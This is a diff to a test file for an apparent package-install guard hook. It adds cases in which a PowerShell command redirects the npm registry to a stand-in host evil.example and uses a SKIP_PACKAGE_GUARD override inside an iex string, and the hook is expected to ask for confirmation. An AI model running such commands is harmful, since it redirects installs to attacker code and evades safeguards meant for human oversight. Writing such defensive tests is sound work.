@@ -368,6 +368,16 @@ describe('rule 4: iex and Invoke-Expression analyse the string like the bare com
     expect(runHook(command, tool).decision).toBeUndefined();
   });
 
+  // Found by the old-vs-new equivalence run: an override inside the iex string covers only that install, not a registry change beside it.
+  it.each<Case>([
+    ['PowerShell', "bash -c \"npm config set registry https://evil.example/\"\nInvoke-Expression 'SKIP_PACKAGE_GUARD=1 npm install github:evil/pkg'"],
+    ['PowerShell', 'npm config set registry https://evil.example/; iex "echo hi; SKIP_PACKAGE_GUARD=1 npm install lodash"'],
+  ])('[%s] %j: a registry change beside an overridden iex install still asks', (tool, command) => {
+    const r = runHook(command, tool);
+    expect(r.decision).toBe('ask');
+    expect(r.reason).toMatch(/Registry or index change that persists/);
+  });
+
   it('the choco form keeps one ask text, not two', () => {
     const r = runHook('iex "choco install git"', 'PowerShell');
     expect(r.decision).toBe('ask');
